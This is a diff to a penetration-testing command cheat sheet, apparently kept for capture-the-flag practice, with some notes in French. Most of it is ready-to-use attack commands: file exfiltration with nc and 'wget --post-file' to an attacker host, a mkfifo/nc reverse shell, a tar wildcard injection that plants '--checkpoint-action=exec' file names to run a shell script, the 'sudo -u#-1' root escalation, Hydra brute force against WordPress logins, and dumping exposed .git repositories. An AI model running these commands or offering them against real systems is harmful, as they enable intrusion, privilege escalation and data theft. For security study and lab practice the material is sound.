@@ -9,6 +9,8 @@ Collection of useful penetration testing and hacking commands.
 - [Crack with john](#crack-with-john)
 - [Local Server](#local-server)
 - [SSH](#ssh)
+- [Grep a file](#grep-a-file)
+- [Upload a file](#upload-a-file)
 - [Hydra Brute Force](#hydra-brute-force)
 - [SMB](#smb)
 - [Stabilize shell](#stabilize-shell)
@@ -179,12 +181,45 @@ scp <FILE> <USERNAME>@<SERVER_IP>:<DESTINATION>
 chmod 600 id_rsa
 ssh -i <ID_RSA_FILE> <USERNAME>@<SERVER_IP>
 ````
+----
+
+# Grep a file
+
+- **With SSH**
+````
+scp <USERNAME>@<SERVER_IP>:<FILE> <DESTINATION>
+````
+
+- **With NC**
+
+local machine :
+````
+nc -l -p <port> > file
+````
+distant machine
+````
+nc -w 3 <local ip> <port> < file
+````
+
+----
+
+# Upload a file
+
+- **SSH**
+````
+scp <FILE> <USERNAME>@<SERVER_IP>:<DESTINATION>
+````
+
+- **Wget**
+````
+sudo wget --post-file='fichier' <localip>:<port>
+````
 
 ----
 
 ## Hydra Brute Force
 
-- Find Uername / Password WP
+- Find Uername / Password WEB (WP / Others)
 ````
 hydra -L <WORDLIST> -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:<FAILED_MESSAGE>" -t 30
 ````
@@ -234,6 +269,15 @@ find / -type f -name "file.txt" 2>/dev/null
 ````
 find / -perm +6000 2>/dev/null | grep '/bin/'
 ````
+- Extract TAR archive
+````
+tar -xvf <archive.tar>
+````
+
+- Bypass command filtration
+````
+echo $(command)
+````
 
 ----
 
@@ -274,6 +318,36 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.187.74 9000 >/tmp/f
 ````
 
+-----------------------------------------------------
+
+
+# TO INCORPORATE
+
+#BorgBackup
+extraire une backup : borg extract home/field/dev/final_archive/::<nom>
+
+#Tar WildCard Inclusion attack
+/1   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/ ( crontabs )
+
+echo "mkfifo /tmp/lhennp; nc <ip> <port> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+
+#FTP/Samba
+Récupérer tout les fichiers d'un coup.
+prompt off ( pour éviter que ça demande pour chaque fihier )
+mget * ( pour tout récupérer )
+
+#(ALL, !root) NOPASSWD
+Sudo ne vérifie pas l'existence de l'identifiant utilisateur spécifié et s'exécute avec un identifiant utilisateur arbitraire avec le sudo priv
+-u#-1 renvoie 0 qui est l'identifiant de root.
+
+Syntaxe : sudo -u#-1 ...
+
+#Git hub repo hacking
+#1 -> Dumper le repo github en question ( gitdumper.sh http://target.tld/.git/ /home/kali/Document/Dumped ), ( "git log" dans le fichier, pour accéder aux logs des commits git hub )
+#2 -> En extraire les données ( extractor.sh /home/kali/Document/Dumped /home/kali/Document/Extracted )
+#3 -> Les lires
+
+
 ----
-
-
